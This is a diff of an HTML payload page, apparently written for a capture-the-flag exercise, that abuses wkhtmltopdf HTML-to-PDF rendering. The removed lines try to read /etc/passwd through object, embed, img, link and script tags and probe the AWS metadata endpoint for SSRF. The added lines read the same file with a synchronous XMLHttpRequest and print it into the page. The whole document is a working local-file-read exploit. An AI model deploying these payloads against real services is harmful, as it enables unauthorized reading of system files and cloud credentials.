@@ -1,68 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CTF File Leak (No iFrames)</title>
+    <title>CTF File Leak (JS Only)</title>
     <style>
-        body { font-family: sans-serif; margin: 20px; }
-        h1 { color: #333; }
-        pre { background-color: #f0f0f0; padding: 15px; border: 1px solid #ccc; white-space: pre-wrap; word-wrap: break-word; font-size: 1.1em; }
-        .leak-attempt { margin-bottom: 25px; border: 1px dashed #bbb; padding: 15px; background-color: #f9f9f9; }
+        body { font-family: sans-serif; margin: 20px; background-color: #282c34; color: #abb2bf; }
+        h1 { color: #61afef; }
+        pre { background-color: #3e4451; padding: 15px; border: 1px solid #5c6370; white-space: pre-wrap; word-wrap: break-word; font-size: 1.1em; color: #98c379; }
+        .info-box { background-color: #3e4451; border-left: 4px solid #c678dd; padding: 10px; margin-top: 20px; color: #e06c75; }
     </style>
 </head>
 <body>
-    <h1>Attempting File Leaks via various HTML tags:</h1>
+    <h1>Attempting to Leak /etc/passwd via JavaScript XMLHttpRequest:</h1>
+    <p>This page tries to read the content of /etc/passwd using the provided JavaScript code and display it below.</p>
 
-    <div class="leak-attempt">
-        <h2>1. Using &lt;object&gt; tag:</h2>
-        <p>This tries to embed the file as a generic object.</p>
-        <pre>
-            <object data="file:///etc/passwd" type="text/plain" width="800" height="400"></object>
-        </pre>
+    <pre id="fileContent">
+        Loading... If nothing appears here, the JavaScript might be blocked, or file access failed.
+    </pre>
+
+    <script>
+        try {
+            var x = new XMLHttpRequest();
+            // Open a synchronous GET request to the local file system
+            x.open('GET', 'file:///etc/passwd', false); // 'false' means synchronous
+            x.send(); // Send the request
+
+            // Check if the request was successful
+            // Status 200 is for HTTP, Status 0 is common for local file:/// requests in some contexts
+            if (x.status === 200 || x.status === 0) {
+                document.getElementById('fileContent').textContent = x.responseText;
+            } else {
+                // If the request fails, show the status code and text
+                document.getElementById('fileContent').textContent = 'Error fetching file: Status ' + x.status + ' - ' + x.statusText + '. This indicates a possible security restriction or file not found.';
+            }
+        } catch (e) {
+            // Catch any JavaScript errors during execution
+            document.getElementById('fileContent').textContent = 'JavaScript Execution Error: ' + e.message + '\n\n' + 'This typically means the browser (wkhtmltopdf) blocked the script or the file access for security reasons.';
+        }
+    </script>
+
+    <div class="info-box">
+        If you see "Loading..." or an error message here, it indicates that the JavaScript code ran, but the file was not accessible or the request was blocked by security policies. If the PDF is completely blank or shows an unrelated error, it means this HTML itself was not processed.
     </div>
 
-    <div class="leak-attempt">
-        <h2>2. Using &lt;embed&gt; tag:</h2>
-        <p>Similar to object, but sometimes handled differently.</p>
-        <pre>
-            <embed src="file:///etc/passwd" type="text/plain" width="800" height="400">
-        </pre>
-    </div>
-
-    <div class="leak-attempt">
-        <h2>3. Using &lt;img&gt; tag (less likely for text, but good for testing):</h2>
-        <p>If the file content is interpreted as an image (e.g., text might show as broken image, but still processed).</p>
-        <pre>
-            <img src="file:///etc/passwd" alt="Attempt to load /etc/passwd" style="max-width:100%;">
-        </pre>
-    </div>
-
-    <div class="leak-attempt">
-        <h2>4. Using &lt;link&gt; tag for stylesheet (can sometimes expose content):</h2>
-        <p>If the file is loaded as a stylesheet, its content might appear in parsing errors or console, sometimes rendered.</p>
-        <pre>
-            <link rel="stylesheet" type="text/css" href="file:///etc/passwd">
-        </pre>
-    </div>
-
-    <div class="leak-attempt">
-        <h2>5. Using &lt;script&gt; tag (less likely for text file, but possible for JS or error messages):</h2>
-        <p>If the file is loaded as a script, its content might generate errors in the PDF's internal console or reveal parts of the file.</p>
-        <pre>
-            <script src="file:///etc/passwd"></script>
-        </pre>
-    </div>
-
-    <div class="leak-attempt">
-        <h2>6. Probing common AWS Metadata endpoint (SSRF fallback):</h2>
-        <p>Still includes this, just in case the server is on EC2 and this specific tag works.</p>
-        <pre>
-            <object data="http://169.254.169.254/latest/meta-data/" type="text/html" width="800" height="400"></object>
-        </pre>
-    </div>
-
-    <hr>
-    <p style="margin-top: 30px; font-size: 0.9em; color: #666;">
-        One of these sections should hopefully display the content of the targeted files if the `wkhtmltopdf` vulnerability allows it.
-    </p>
 </body>
 </html>
